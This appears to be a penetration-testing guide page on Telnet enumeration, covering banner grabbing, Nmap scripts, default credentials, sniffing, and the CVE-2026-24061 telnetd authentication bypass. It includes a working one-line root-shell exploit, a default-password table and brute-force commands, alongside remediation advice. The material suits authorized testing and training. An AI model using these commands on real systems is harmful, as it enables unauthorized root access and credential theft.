% Filename: 02-reconnaissance/enum-network/telnet.md
% Display name: Telnet Enumeration
% Last update: 2026-02-10
% ATT&CK Tactics: TA0043 (Reconnaissance)
% ATT&CK Techniques: T1595 (Active Scanning)
% Authors: @TristanInSec

# Telnet Enumeration

## Overview

Telnet runs on TCP 23 by default. It provides unencrypted remote shell access — all traffic, including credentials, is transmitted in plaintext. While deprecated in favor of SSH, Telnet is still found on legacy systems, network equipment (switches, routers, firewalls), IoT devices, and embedded systems. Any Telnet service in a modern environment is a finding worth reporting.

## ATT&CK Mapping

- **Tactic:** TA0043 - Reconnaissance
- **Technique:** T1595 - Active Scanning

## Prerequisites

- Network access to target Telnet port
- `telnet`, `nc`, or Nmap installed

## Enumeration Techniques

### Banner Grabbing

```bash
nc -nv <target> 23
```

Expected output varies significantly by device type:

**Linux/Unix:**
```text
Ubuntu 22.04 LTS
login:
```

**Network equipment (Cisco):**
```text
User Access Verification
Username:
```

**Embedded/IoT:**
```text
BusyBox v1.30.1 built-in shell
login:
```

Telnet banners frequently reveal the OS, distribution, device type, and firmware version directly — more information leakage than most other protocols.

```bash
# Nmap
# https://nmap.org/
nmap -sV -p 23 <target>
```

### Telnet Option Negotiation

Telnet uses option negotiation (DO, DONT, WILL, WONT) during connection setup. This negotiation can fingerprint the server implementation:

```bash
# Nmap
# https://nmap.org/
nmap -p 23 --script telnet-ntlm-info <target>
```

Against Windows Telnet services, this script extracts NTLM authentication data including the internal domain name, server hostname, and DNS domain — the same disclosure seen with SMTP/IMAP/POP3 NTLM info scripts.

### Default Credential Testing

Telnet services — especially on network equipment and IoT devices — frequently use default or weak credentials:

| Device Type | Common Defaults |
|-------------|-----------------|
| Cisco IOS | `cisco` / `cisco`, `admin` / `admin` |
| Network routers | `admin` / `admin`, `admin` / `password` |
| Embedded Linux | `root` / `root`, `root` / (empty) |
| IoT devices | `admin` / `admin`, `admin` / `1234` |
| Printers | `admin` / (empty) |

```bash
telnet <target>
# Try default credentials for the identified device type
```

For the full list of default credentials by vendor, consult vendor documentation or default credential databases. Do not rely on guessing.

### Nmap NSE Scripts

```bash
# Nmap
# https://nmap.org/
# Brute-force Telnet credentials
nmap -p 23 --script telnet-brute --script-args userdb=users.txt,passdb=passwords.txt <target>

# Encrypt Telnet option negotiation details
nmap -p 23 --script telnet-encryption <target>

# NTLM info disclosure (Windows Telnet)
nmap -p 23 --script telnet-ntlm-info <target>
```

### Telnet on Non-Standard Ports

Telnet is sometimes deployed on non-standard ports for management interfaces:

```bash
# Nmap
# https://nmap.org/
# Common alternate Telnet ports
nmap -sV -p 23,2323,8023,9023 <target>

# Full port scan filtered for Telnet services
nmap -sV -p- --open <target> | grep telnet
```

Ports 2323 and 8023 are common alternates, particularly on IoT devices and network equipment management interfaces.

### Network Traffic Capture

Because Telnet transmits everything in plaintext, credentials can be captured passively if you have network visibility:

```bash
# Capture Telnet traffic on the wire
# Wireshark
# https://www.wireshark.org/
# Filter: tcp.port == 23
# Right-click a packet → Follow → TCP Stream
```

This is relevant both offensively (credential sniffing on a compromised network segment) and as a detection finding — Telnet traffic on a monitored network is inherently a security risk.

### CVE-2026-24061 — GNU InetUtils telnetd Auth Bypass

CVE-2026-24061 (CVSS 9.8) is a critical authentication bypass in GNU InetUtils telnetd versions 1.9.3 through 2.7. The telnetd server passes the client-supplied `USER` environment variable directly to `/usr/bin/login` without sanitization. Setting `USER` to `-f root` causes login to interpret `-f` as the "pre-authenticated" flag, granting an immediate root shell without any credentials.

This vulnerability is trivially exploitable, has public PoC code, and CISA added it to the Known Exploited Vulnerabilities (KEV) catalog on January 26, 2026. Affected distributions include Debian, Ubuntu, Kali Linux, and Trisquel.

```bash
# Nmap
# https://nmap.org/
# Fingerprint the telnetd implementation and version
nmap -sV -p 23 <target>
# Look for "GNU inetutils" or "inetutils-telnetd" in version info

# If version detection is inconclusive, connect and check the banner
nc -nv <target> 23
# GNU InetUtils telnetd may identify itself in the banner or
# can be fingerprinted by its option negotiation behavior

# PoC — exploit via Telnet NEW_ENVIRON option (use only with authorization)
# The -a flag triggers automatic login, sending the USER environment
# variable to the server via NEW_ENVIRON negotiation (RFC 1572).
# Setting USER to "-f root" causes /usr/bin/login to interpret -f
# as the pre-authenticated flag, granting an immediate root shell.
USER='-f root' telnet -a <target>

# Expected result on a vulnerable host:
# root@target:~#
# (immediate root shell, no password prompt)
```

**Remediation:** Apply distribution patches (e.g., inetutils 2.7-2+) or disable telnetd entirely and use SSH. As a temporary workaround, restrict network access to TCP 23 to trusted management networks only.

## Post-Enumeration

With Telnet access confirmed, prioritize:
- Default and weak credential testing against the identified device type
- CVE-2026-24061 check on any GNU InetUtils telnetd instance — trivial remote root
- Capturing plaintext credentials via network sniffing if positioned on the same segment
- Identifying the device type and firmware version for known CVE research
- Documenting Telnet as a finding — its presence is a security issue regardless of credential strength
- Checking for the same credentials on other services (SSH, web management interfaces)

## References

### Official Documentation

- [Nmap telnet-brute NSE Script](https://nmap.org/nsedoc/scripts/telnet-brute.html)
- [Nmap telnet-ntlm-info NSE Script](https://nmap.org/nsedoc/scripts/telnet-ntlm-info.html)
- [Nmap telnet-encryption NSE Script](https://nmap.org/nsedoc/scripts/telnet-encryption.html)
- [RFC 854 - Telnet Protocol Specification](https://datatracker.ietf.org/doc/html/rfc854)

### CVE References

- [CVE-2026-24061 - GNU InetUtils telnetd Remote Auth Bypass (CVSS 9.8)](https://nvd.nist.gov/vuln/detail/CVE-2026-24061)
- [CVE-2026-24061 - OffSec Analysis](https://www.offsec.com/blog/cve-2026-24061/)
- [CVE-2026-24061 - GNU InetUtils Security Advisory (oss-security mailing list)](https://www.openwall.com/lists/oss-security/2026/01/20/2)
- [CVE-2026-24061 - Upstream Patch — telnetd: Sanitize all variable expansions (Codeberg)](https://codeberg.org/inetutils/inetutils/commit/ccba9f748aa8d50a38d7748e2e60362edd6a32cc)

### MITRE ATT&CK

- [T1595 - Active Scanning](https://attack.mitre.org/techniques/T1595/)
